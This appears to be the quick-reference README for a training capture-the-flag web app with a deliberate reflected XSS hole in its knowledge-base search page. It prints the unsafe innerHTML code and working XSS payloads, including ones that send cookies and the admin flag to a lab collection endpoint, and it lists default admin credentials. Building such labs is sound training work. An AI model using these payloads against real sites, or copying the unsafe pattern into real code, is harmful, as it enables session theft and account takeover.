# Quick Reference

## 🚀 Start the CTF

```bash
docker compose up --build
```

## 🔗 Access Points

- **Frontend**: http://localhost:5174
- **API**: http://localhost:4001
- **Database**: localhost:5433
- **Redis**: localhost:6380

## 👤 Default Admin Credentials

- **Email**: admin@intradesk.local
- **Password**: admin_secure_password_123

## 🎯 Key URLs

- Login: http://localhost:5174/login
- Register: http://localhost:5174/register
- Dashboard: http://localhost:5174/dashboard
- Knowledge Base: http://localhost:5174/kb
- Report: http://localhost:5174/report

## 🐛 The Vulnerability

**File**: `apps/web/src/pages/KnowledgeBase.tsx`
**Line**: ~80-90
**Function**: `renderResultsHeader()`

```typescript
// UNSAFE: User input directly inserted into innerHTML
headerHTML += 'Results for "' + searchTerm + '"';
resultsDiv.innerHTML = headerHTML;
```

## 💉 XSS Test Payloads

### Test HTML Rendering
```
/kb?search=<b>test</b>
```

### Basic Alert
```
/kb?search="><script>alert('XSS')</script>
```

### Cookie Theft
```
/kb?search="><img src=x onerror=fetch('/api/collect?d='+document.cookie)>
```

### Fetch Admin Flag
```
/kb?search="><img src=x onerror="fetch('/api/admin/flag').then(r=>r.json()).then(d=>fetch('/api/collect?d='+d.flag))">
```

## 🔧 Docker Commands

```bash
# Start services
docker compose up

# Start in background
docker compose up -d

# Rebuild and start
docker compose up --build

# Stop services
docker compose down

# Stop and remove volumes
docker compose down -v

# View logs
docker compose logs -f

# View specific service logs
docker compose logs -f api
docker compose logs -f web
docker compose logs -f bot
```

## 📊 Database Access

```bash
# Connect to PostgreSQL
docker compose exec db psql -U intradesk intradesk_kb

# View users
SELECT id, email, role, flag FROM users;

# View reports
SELECT * FROM reports ORDER BY created_at DESC;

# View exfil logs
SELECT * FROM exfil_logs ORDER BY created_at DESC;
```

## 🔍 Debugging

### Check if services are running
```bash
docker compose ps
```

### Check API health
```bash
curl http://localhost:4001/health
```

### Watch bot logs
```bash
docker compose logs -f bot
```

### Restart specific service
```bash
docker compose restart api
docker compose restart web
docker compose restart bot
```

## 📝 Common Issues

### Port already in use
```bash
# Find process using port
lsof -ti:5174 | xargs kill -9
lsof -ti:4001 | xargs kill -9
```

### Database not initialized
```bash
docker compose down -v
docker compose up --build
```

### Bot not processing reports
```bash
# Check Redis connection
docker compose logs redis

# Check bot worker
docker compose logs bot

# Restart bot
docker compose restart bot
```

## 🧪 Testing Flow

1. **Register User**
   ```
   POST http://localhost:4001/api/auth/register
   Body: { "email": "test@test.com", "password": "password" }
   ```

2. **Login**
   ```
   POST http://localhost:4001/api/auth/login
   Body: { "email": "test@test.com", "password": "password" }
   ```

3. **Search KB**
   ```
   GET http://localhost:5174/kb?search=<b>test</b>
   ```

4. **Craft Exploit**
   ```
   URL: /kb?search="><img src=x onerror=fetch('/api/collect?d='+document.cookie)>
   ```

5. **Submit Report**
   ```
   POST http://localhost:4001/api/report
   Body: { "url": "http://localhost:5174/kb?search=..." }
   ```

6. **Check Logs**
   ```
   SELECT * FROM exfil_logs;
   ```

## 🏗️ File Structure Cheat Sheet

```
apps/
├── api/src/
│   ├── index.ts           # Main server
│   ├── db/index.ts        # Database
│   ├── middleware/
│   │   ├── auth.ts        # JWT auth
│   │   └── errorHandler.ts
│   └── routes/
│       ├── auth.ts        # Login/register
│       ├── kb.ts          # Knowledge base
│       ├── report.ts      # Report submission
│       ├── admin.ts       # Admin endpoints
│       └── collect.ts     # Exfiltration
│
├── web/src/
│   ├── App.tsx            # Router
│   ├── context/AuthContext.tsx
│   ├── pages/
│   │   ├── Login.tsx
│   │   ├── Register.tsx
│   │   ├── Dashboard.tsx
│   │   ├── KnowledgeBase.tsx  # ⚠️ XSS HERE
│   │   ├── KBArticle.tsx
│   │   └── Report.tsx
│   └── components/
│       ├── Layout.tsx
│       └── ProtectedRoute.tsx
│
└── bot/src/
    └── index.ts           # Playwright worker
```

## 📚 API Endpoints Quick Reference

### Auth
- `POST /api/auth/login`
- `POST /api/auth/register`
- `GET /api/auth/me`
- `POST /api/auth/logout`

### KB
- `GET /api/kb/articles?search=X&tag=Y`
- `GET /api/kb/articles/:id`
- `GET /api/kb/tags`

### Report
- `POST /api/report`
- `GET /api/report/my-reports`

### Admin
- `GET /api/admin/flag`
- `GET /api/admin/reports`
- `GET /api/admin/exfil-logs`

### Collect
- `GET /api/collect?d=<data>`
- `POST /api/collect`
